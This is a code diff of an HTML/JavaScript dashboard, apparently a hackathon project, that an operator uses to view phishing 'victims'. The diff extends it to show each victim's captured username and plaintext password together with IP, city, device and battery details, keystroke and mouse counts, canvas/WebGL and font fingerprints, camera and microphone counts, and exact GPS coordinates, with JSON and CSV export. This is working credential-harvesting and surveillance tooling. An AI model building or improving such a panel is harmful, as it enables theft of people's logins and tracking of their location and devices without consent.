@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Víctimas Capturadas</title>
+    <title>Dashboard Avanzado - Phishing Analytics</title>
     <style>
         * {
             margin: 0;
@@ -12,313 +12,773 @@
         }
         
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e27;
+            color: #e0e0e0;
             padding: 20px;
+            line-height: 1.6;
         }
         
         .header {
             text-align: center;
             margin-bottom: 30px;
             padding: 30px;
-            background: #1a1a1a;
-            border-radius: 10px;
-            border: 2px solid #00ff00;
-            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
+            border-radius: 15px;
+            border: 2px solid #00ff88;
+            box-shadow: 0 0 30px rgba(0,255,136,0.2);
         }
         
         .header h1 {
-            font-size: 42px;
-            text-shadow: 0 0 10px #00ff00;
+            font-size: 48px;
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0,255,136,0.3);
+        }
+        
+        .header p {
+            color: #888;
+            font-size: 16px;
+        }
+        
+        .controls {
+            margin-bottom: 25px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            color: #0a0e27;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,255,136,0.5);
+        }
+        
+        button.danger {
+            background: linear-gradient(135deg, #ff3333, #ff6b6b);
+        }
+        
+        button.secondary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
         }
         
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
         
         .stat-card {
-            background: #1a1a1a;
+            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
             padding: 25px;
-            border-radius: 8px;
-            border: 1px solid #00ff00;
+            border-radius: 12px;
+            border: 1px solid #00ff8844;
             text-align: center;
             transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.1), transparent);
+            transition: 0.5s;
+        }
+        
+        .stat-card:hover::before {
+            left: 100%;
         }
         
         .stat-card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 5px 20px rgba(0,255,0,0.4);
+            border-color: #00ff88;
+            box-shadow: 0 8px 25px rgba(0,255,136,0.3);
         }
         
         .stat-card h3 {
-            font-size: 14px;
-            color: #00ff00;
+            font-size: 13px;
+            color: #00ff88;
             margin-bottom: 15px;
             text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         .stat-card .number {
-            font-size: 36px;
+            font-size: 42px;
             font-weight: bold;
-            color: #00ff00;
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         
-        .controls {
+        .victims-section {
+            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #00ff8844;
+            margin-bottom: 20px;
+        }
+        
+        .victims-section h2 {
+            margin-bottom: 25px;
+            font-size: 28px;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .filter-bar {
             margin-bottom: 20px;
             display: flex;
             gap: 10px;
             flex-wrap: wrap;
         }
         
-        button {
-            background: #00ff00;
-            color: #0a0a0a;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
+        .filter-bar input,
+        .filter-bar select {
+            background: #0a0e27;
+            color: #e0e0e0;
+            border: 1px solid #00ff8844;
+            padding: 10px 15px;
+            border-radius: 6px;
             font-size: 14px;
+        }
+        
+        .filter-bar input:focus,
+        .filter-bar select:focus {
+            outline: none;
+            border-color: #00ff88;
+        }
+        
+        .victim-card {
+            background: #0a0e27;
+            border: 1px solid #00ff8833;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
             transition: all 0.3s;
         }
         
-        button:hover {
-            background: #00cc00;
-            transform: scale(1.05);
+        .victim-card:hover {
+            border-color: #00ff88;
+            box-shadow: 0 4px 15px rgba(0,255,136,0.2);
+            transform: translateX(5px);
         }
         
-        .victims-table {
-            background: #1a1a1a;
-            padding: 25px;
-            border-radius: 8px;
-            border: 1px solid #00ff00;
-            overflow-x: auto;
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #00ff8822;
         }
         
-        .victims-table h2 {
-            margin-bottom: 20px;
-            font-size: 24px;
+        .victim-header h3 {
+            color: #00ff88;
+            font-size: 20px;
         }
         
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-        }
-        
-        th, td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #333;
-        }
-        
-        th {
-            background: #0a0a0a;
-            font-weight: bold;
-            text-transform: uppercase;
+        .victim-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: rgba(0,255,136,0.2);
+            border-radius: 12px;
             font-size: 12px;
+            color: #00ff88;
+            margin-left: 8px;
         }
         
-        tr:hover {
-            background: #2a2a2a;
+        .victim-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+        
+        .detail-section {
+            background: #1a1f3a;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 3px solid #00ff88;
+        }
+        
+        .detail-section h4 {
+            color: #00d4ff;
+            margin-bottom: 10px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        
+        .detail-label {
+            color: #888;
+        }
+        
+        .detail-value {
+            color: #e0e0e0;
+            font-weight: 500;
+        }
+        
+        .password-value {
+            color: #ffff00;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(255,255,0,0.3);
         }
         
         .loading {
             text-align: center;
-            padding: 40px;
+            padding: 60px;
             font-size: 20px;
+            color: #888;
         }
         
-        .password {
-            color: #ffff00;
-            font-weight: bold;
+        .spinner {
+            border: 4px solid rgba(0,255,136,0.1);
+            border-top: 4px solid #00ff88;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
         
-        .status {
-            display: inline-block;
-            padding: 2px 8px;
-            background: rgba(0,255,0,0.2);
-            border-radius: 3px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #666;
+        }
+        
+        .empty-state h3 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .fingerprint-hash {
+            font-family: 'Courier New', monospace;
+            color: #00d4ff;
             font-size: 11px;
+            margin-top: 5px;
+        }
+        
+        .expand-btn {
+            background: #2d1b3d;
+            color: #00ff88;
+            border: 1px solid #00ff8844;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .expand-btn:hover {
+            background: #00ff8822;
+            border-color: #00ff88;
+        }
+        
+        .hidden-details {
+            display: none;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #00ff8822;
+        }
+        
+        .hidden-details.show {
+            display: block;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🎯 PHISHING DASHBOARD</h1>
-        <p>Monitoreo en Tiempo Real - Hackathon 2025</p>
+        <h1>🎯 PHISHING ANALYTICS v2.0</h1>
+        <p>Sistema Avanzado de Captura y Análisis de Datos | Hackathon 2025</p>
     </div>
     
     <div class="controls">
         <button onclick="loadData()">🔄 Actualizar</button>
-        <button onclick="clearData()" style="background: #ff3333;">🗑️ Limpiar Datos</button>
-        <button onclick="exportData()">💾 Exportar JSON</button>
+        <button onclick="clearData()" class="danger">🗑️ Limpiar Datos</button>
+        <button onclick="exportData()" class="secondary">💾 Exportar JSON</button>
+        <button onclick="exportCSV()" class="secondary">📊 Exportar CSV</button>
     </div>
     
-    <div class="stats">
+    <div class="stats" id="statsContainer">
         <div class="stat-card">
-            <h3>Víctimas Totales</h3>
+            <h3>👥 Víctimas Totales</h3>
             <div class="number" id="totalVictims">0</div>
         </div>
         <div class="stat-card">
-            <h3>Países Únicos</h3>
+            <h3>🌍 Países</h3>
             <div class="number" id="uniqueCountries">0</div>
         </div>
         <div class="stat-card">
-            <h3>Ciudades Únicas</h3>
+            <h3>🏙️ Ciudades</h3>
             <div class="number" id="uniqueCities">0</div>
         </div>
         <div class="stat-card">
-            <h3>Última Captura</h3>
+            <h3>📱 Móviles</h3>
+            <div class="number" id="mobileDevices">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>💻 Desktops</h3>
+            <div class="number" id="desktopDevices">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>🕐 Última Captura</h3>
             <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
         </div>
     </div>
     
-    <div class="victims-table">
-        <h2>📋 Registro de Víctimas</h2>
-        <div id="tableContainer" class="loading">Cargando datos...</div>
+    <div class="victims-section">
+        <h2>📋 Registro Detallado de Víctimas</h2>
+        
+        <div class="filter-bar">
+            <input type="text" id="searchInput" placeholder="🔍 Buscar por IP, usuario, ciudad..." onkeyup="filterVictims()">
+            <select id="deviceFilter" onchange="filterVictims()">
+                <option value="">Todos los dispositivos</option>
+                <option value="Mobile">📱 Móviles</option>
+                <option value="Desktop">💻 Desktops</option>
+                <option value="Tablet">📱 Tablets</option>
+            </select>
+            <select id="osFilter" onchange="filterVictims()">
+                <option value="">Todos los SO</option>
+            </select>
+        </div>
+        
+        <div id="victimsContainer" class="loading">
+            <div class="spinner"></div>
+            <p>Cargando datos...</p>
+        </div>
     </div>
 
     <script>
+        let victimsData = [];
         let autoRefresh = true;
         
         async function loadData() {
             try {
                 const response = await fetch('/api/victims');
-                const victims = await response.json();
+                victimsData = await response.json();
                 
-                // Actualizar estadísticas
-                document.getElementById('totalVictims').textContent = victims.length;
-                
-                const uniqueCountries = [...new Set(victims.map(v => v.country))];
-                document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
-                
-                const uniqueCities = [...new Set(victims.map(v => v.city))];
-                document.getElementById('uniqueCities').textContent = uniqueCities.length;
-                
-                if (victims.length > 0) {
-                    const lastVictim = victims[victims.length - 1];
-                    const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
-                    document.getElementById('lastCapture').textContent = timeAgo;
-                }
-                
-                // Crear tabla
-                if (victims.length === 0) {
-                    document.getElementById('tableContainer').innerHTML = 
-                        '<p class="loading">No hay víctimas capturadas aún. Esperando conexiones...</p>';
-                } else {
-                    let tableHTML = `
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>#</th>
-                                    <th>👤 Usuario</th>
-                                    <th>🔑 Contraseña</th>
-                                    <th>🌐 IP</th>
-                                    <th>🌍 País</th>
-                                    <th>🏙️ Ciudad</th>
-                                    <th>💻 Navegador</th>
-                                    <th>📱 Plataforma</th>
-                                    <th>🕐 Fecha</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                    `;
-                    
-                    victims.reverse().forEach((victim, index) => {
-                        const browser = getBrowser(victim.userAgent);
-                        const date = new Date(victim.timestamp).toLocaleString('es-MX');
-                        
-                        tableHTML += `
-                            <tr>
-                                <td><span class="status">${victims.length - index}</span></td>
-                                <td><strong>${victim.username}</strong></td>
-                                <td class="password">${victim.password}</td>
-                                <td>${victim.ip}</td>
-                                <td>${victim.country}</td>
-                                <td>${victim.city}</td>
-                                <td>${browser}</td>
-                                <td>${victim.platform || 'N/A'}</td>
-                                <td>${date}</td>
-                            </tr>
-                        `;
-                    });
-                    
-                    tableHTML += '</tbody></table>';
-                    document.getElementById('tableContainer').innerHTML = tableHTML;
-                }
+                updateStats();
+                renderVictims(victimsData);
+                updateFilters();
                 
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('tableContainer').innerHTML = 
-                    '<p class="loading">❌ Error al cargar datos. Verifica que el servidor esté activo.</p>';
+                document.getElementById('victimsContainer').innerHTML = 
+                    '<div class="empty-state"><h3>❌ Error al cargar datos</h3><p>Verifica que el servidor esté activo</p></div>';
             }
         }
         
-        function getBrowser(userAgent) {
-            if (!userAgent) return '❓ Unknown';
-            const ua = userAgent.toLowerCase();
-            if (ua.includes('chrome')) return '🌐 Chrome';
-            if (ua.includes('firefox')) return '🦊 Firefox';
-            if (ua.includes('safari')) return '🧭 Safari';
-            if (ua.includes('edge')) return '🌊 Edge';
-            if (ua.includes('opera')) return '🎭 Opera';
-            return '❓ Otro';
-        }
-        
-        function getTimeAgo(date) {
-            const seconds = Math.floor((new Date() - date) / 1000);
+        function updateStats() {
+            document.getElementById('totalVictims').textContent = victimsData.length;
             
-            if (seconds < 60) return 'Hace ' + seconds + ' seg';
-            if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
-            if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
-            return 'Hace ' + Math.floor(seconds / 86400) + ' días';
-        }
-        
-        async function clearData() {
-            if (confirm('¿Seguro que quieres eliminar TODOS los datos capturados?')) {
-                try {
-                    await fetch('/api/clear', { method: 'DELETE' });
-                    alert('✅ Datos eliminados correctamente');
-                    loadData();
-                } catch (error) {
-                    alert('❌ Error al eliminar datos');
-                }
+            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
+            document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
+            
+            const uniqueCities = [...new Set(victimsData.map(v => v.network?.city || 'Unknown'))];
+            document.getElementById('uniqueCities').textContent = uniqueCities.length;
+            
+            const mobileCount = victimsData.filter(v => v.device?.type === 'Mobile').length;
+            document.getElementById('mobileDevices').textContent = mobileCount;
+            
+            const desktopCount = victimsData.filter(v => v.device?.type === 'Desktop').length;
+            document.getElementById('desktopDevices').textContent = desktopCount;
+            
+            if (victimsData.length > 0) {
+                const lastVictim = victimsData[victimsData.length - 1];
+                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
+                document.getElementById('lastCapture').textContent = timeAgo;
             }
         }
         
-        async function exportData() {
-            try {
-                const response = await fetch('/api/victims');
-                const victims = await response.json();
+        function updateFilters() {
+            const osSet = [...new Set(victimsData.map(v => v.os?.name || 'Unknown'))];
+            const osFilter = document.getElementById('osFilter');
+            osFilter.innerHTML = '<option value="">Todos los SO</option>';
+            osSet.forEach(os => {
+                const option = document.createElement('option');
+                option.value = os;
+                option.textContent = getOSIcon(os) + ' ' + os;
+                osFilter.appendChild(option);
+            });
+        }
+        
+        function renderVictims(victims) {
+            const container = document.getElementById('victimsContainer');
+            
+            if (victims.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <h3>📭 Sin víctimas capturadas</h3>
+                        <p>Esperando conexiones...</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            container.innerHTML = '';
+            victims.reverse().forEach((victim, index) => {
+                const card = createVictimCard(victim, victims.length - index);
+                container.appendChild(card);
+            });
+        }
+        
+        function createVictimCard(victim, number) {
+            const card = document.createElement('div');
+            card.className = 'victim-card';
+            
+            const date = new Date(victim.timestamp).toLocaleString('es-MX');
+            const deviceIcon = getDeviceIcon(victim.device?.type);
+            const osIcon = getOSIcon(victim.os?.name);
+            const browserIcon = getBrowserIcon(victim.browser?.name);
+            
+            card.innerHTML = `
+                <div class="victim-header">
+                    <div>
+                        <h3>${deviceIcon} ${victim.username || 'Visitor'}</h3>
+                        <span class="victim-badge">#${number}</span>
+                        <span class="victim-badge">${victim.device?.type || 'Unknown'}</span>
+                        <div class="fingerprint-hash">🔐 ${victim.fingerprint}</div>
+                    </div>
+                    <div style="text-align: right; color: #888; font-size: 13px;">
+                        <div>🕐 ${date}</div>
+                        <div style="margin-top: 5px;">${getTimeAgo(new Date(victim.timestamp))}</div>
+                    </div>
+                </div>
                 
-                const dataStr = JSON.stringify(victims, null, 2);
-                const dataBlob = new Blob([dataStr], { type: 'application/json' });
+                <div class="victim-details">
+                    <div class="detail-section">
+                        <h4>🔐 Credenciales</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Usuario:</span>
+                            <span class="detail-value">${victim.username || 'N/A'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Contraseña:</span>
+                            <span class="password-value">${victim.password || 'N/A'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>🌐 Red e IP</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">IP:</span>
+                            <span class="detail-value">${victim.network?.ip || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">País:</span>
+                            <span class="detail-value">${victim.network?.country || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Ciudad:</span>
+                            <span class="detail-value">${victim.network?.city || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Zona Horaria:</span>
+                            <span class="detail-value">${victim.network?.timezone || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Tipo Conexión:</span>
+                            <span class="detail-value">${victim.network?.connectionType || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Velocidad:</span>
+                            <span class="detail-value">${victim.network?.downlink || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Latencia:</span>
+                            <span class="detail-value">${victim.network?.rtt || 'Unknown'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>${deviceIcon} Dispositivo</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Tipo:</span>
+                            <span class="detail-value">${victim.device?.type || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Modelo:</span>
+                            <span class="detail-value">${victim.device?.model || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Plataforma:</span>
+                            <span class="detail-value">${victim.device?.platform || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">CPU Cores:</span>
+                            <span class="detail-value">${victim.device?.cpuCores || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">RAM:</span>
+                            <span class="detail-value">${victim.device?.memory || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Touch:</span>
+                            <span class="detail-value">${victim.device?.touchSupport ? '✅ Sí' : '❌ No'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>${osIcon} Sistema Operativo</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">SO:</span>
+                            <span class="detail-value">${victim.os?.name || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Versión:</span>
+                            <span class="detail-value">${victim.os?.version || 'Unknown'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>${browserIcon} Navegador</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Navegador:</span>
+                            <span class="detail-value">${victim.browser?.name || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Versión:</span>
+                            <span class="detail-value">${victim.browser?.version || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Idioma:</span>
+                            <span class="detail-value">${victim.browser?.language || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Cookies:</span>
+                            <span class="detail-value">${victim.browser?.cookiesEnabled ? '✅' : '❌'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">DNT:</span>
+                            <span class="detail-value">${victim.browser?.doNotTrack || 'Unknown'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>🖥️ Pantalla</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Resolución:</span>
+                            <span class="detail-value">${victim.screen?.resolution || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Color Depth:</span>
+                            <span class="detail-value">${victim.screen?.colorDepth || 'Unknown'} bits</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Orientación:</span>
+                            <span class="detail-value">${victim.screen?.orientation || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Pixel Ratio:</span>
+                            <span class="detail-value">${victim.screen?.pixelRatio || 1}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>🔋 Batería</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Nivel:</span>
+                            <span class="detail-value">${victim.battery?.level || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Cargando:</span>
+                            <span class="detail-value">${victim.battery?.charging ? '⚡ Sí' : '🔌 No'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">T. Descarga:</span>
+                            <span class="detail-value">${victim.battery?.dischargingTime || 'N/A'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>🖱️ Comportamiento</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Mouse:</span>
+                            <span class="detail-value">${victim.behavior?.mouseMovements || 0} mov</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Clicks:</span>
+                            <span class="detail-value">${victim.behavior?.clicks || 0}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Teclas:</span>
+                            <span class="detail-value">${victim.behavior?.keyPresses || 0}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Scroll:</span>
+                            <span class="detail-value">${victim.behavior?.scrollDepth || 0}%</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Tiempo:</span>
+                            <span class="detail-value">${victim.behavior?.timeOnPage || 0}s</span>
+                        </div>
+                    </div>
+                </div>
                 
-                const url = URL.createObjectURL(dataBlob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `victims_${new Date().toISOString()}.json`;
-                link.click();
-            } catch (error) {
-                alert('❌ Error al exportar datos');
-            }
-        }
-        
-        // Cargar datos al inicio
-        loadData();
-        
-        // Auto-refresh cada 5 segundos
-        setInterval(() => {
-            if (autoRefresh) {
-                loadData();
-            }
-        }, 5000);
-    </script>
-</body>
-</html>
+                <button class="expand-btn" onclick="toggleDetails(this)">
+                    🔍 Ver Detalles Avanzados
+                </button>
+                
+                <div class="hidden-details">
+                    <div class="victim-details">
+                        <div class="detail-section">
+                            <h4>🎨 Fingerprints</h4>
+                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
+                                <span class="detail-label">Canvas:</span>
+                                <span class="detail-value" style="font-family: monospace; font-size: 11px; word-break: break-all;">${victim.fingerprints?.canvas || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">WebGL:</span>
+                                <span class="detail-value">${victim.fingerprints?.webgl || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">GPU Vendor:</span>
+                                <span class="detail-value">${victim.fingerprints?.webglVendor || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
+                                <span class="detail-label">GPU Renderer:</span>
+                                <span class="detail-value" style="font-size: 11px;">${victim.fingerprints?.webglRenderer || 'N/A'}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-section">
+                            <h4>🔤 Fuentes (${(victim.fingerprints?.fonts || []).length})</h4>
+                            <div class="detail-value" style="font-size: 12px;">
+                                ${(victim.fingerprints?.fonts || []).join(', ') || 'N/A'}
+                            </div>
+                        </div>
+                        
+                        <div class="detail-section">
+                            <h4>📸 Hardware</h4>
+                            <div class="detail-item">
+                                <span class="detail-label">Cámaras:</span>
+                                <span class="detail-value">${victim.hardware?.videoInputs || 'Unknown'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Micrófonos:</span>
+                                <span class="detail-value">${victim.hardware?.audioInputs || 'Unknown'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Altavoces:</span>
+                                <span class="detail-value">${victim.hardware?.audioOutputs || 'Unknown'}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-section">
+                            <h4>📡 Sensores</h4>
+                            <div class="detail-item">
+                                <span class="detail-label">Acelerómetro:</span>
+                                <span class="detail-value">${victim.sensors?.accelerometer ? '✅' : '❌'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Giroscopio:</span>
+                                <span class="detail-value">${victim.sensors?.gyroscope ? '✅' : '❌'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Magnetómetro:</span>
+                                <span class="detail-value">${victim.sensors?.magnetometer ? '✅' : '❌'}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-section">
+                            <h4>🔐 Privacidad</h4>
+                            <div class="detail-item">
+                                <span class="detail-label">LocalStorage:</span>
+                                <span class="detail-value">${victim.privacy?.localStorageAvailable ? '✅' : '❌'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">SessionStorage:</span>
+                                <span class="detail-value">${victim.privacy?.sessionStorageAvailable ? '✅' : '❌'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">IndexedDB:</span>
+                                <span class="detail-value">${victim.privacy?.indexedDBAvailable ? '✅' : '❌'}</span>
+                            </div>
+                        </div>
+                        
+                        ${victim.geolocation?.latitude ? `
+                        <div class="detail-section">
+                            <h4>🌍 Geolocalización</h4>
+                            <div class="detail-item">
+                                <span class="detail-label">Latitud:</span>
+                                <span class="detail-value">${victim.geolocation?.latitude?.toFixed(6) || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Longitud:</span>
+                                <span class="detail-value">${victim.geolocation?.longitude?.toFixed(6) || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Precisión:</span>
+                                <span class="detail-value">${victim.geolocation?.accuracy ? Math.round(victim.geolocation.accuracy) + 'm' : 'N/A'}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Altitud:</span>
+                                <span class="detail-value">${victim.geolocation?.altitude ? Math.round(victim.geolocation.altitude) + 'm' : 'N/A'}</span>
+                            </div>
+                            <div style="margin-top: 10px;">
+                                <a href="https://www.google.com/maps?q=${victim.geolocation?.latitude},${victim.geolocation?.longitude}" 
+                                   target="_blank" 
+                                   style="color: #00ff88; text-decoration: none;">
+                                   📍 Ver en Google Maps
+                                </a>
+                            </div>
+                        </div>
+                        ` : ''}
+                        
+                        <div class="detail-section">
+                            <h4>🔗 Referencia</h4>
+                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
+                                <span class="detail-label">URL:</span>
+                                <span class="detail-value" style="font-size: 11px; word-break: break-all;">${victim.url || 'N/A'}</span>
+                            </div>
+                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
+                                <span class="detail-label">Referrer:</span>
+                                <span class="detail-value" style="font-size: 11px; word-break: break-all;">${victim.referrer || 'Direct'}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-section">
+                            <h4>🔧 User Agent</h4>
+                            <div class="detail-value" style="font-size: 11px; word-break: break-all; font-family: monospace;">
+                                ${victim.browser?.userAgent || 'N/A'}
+                            </div>
+                        </div>
+                    </div>
+                </div
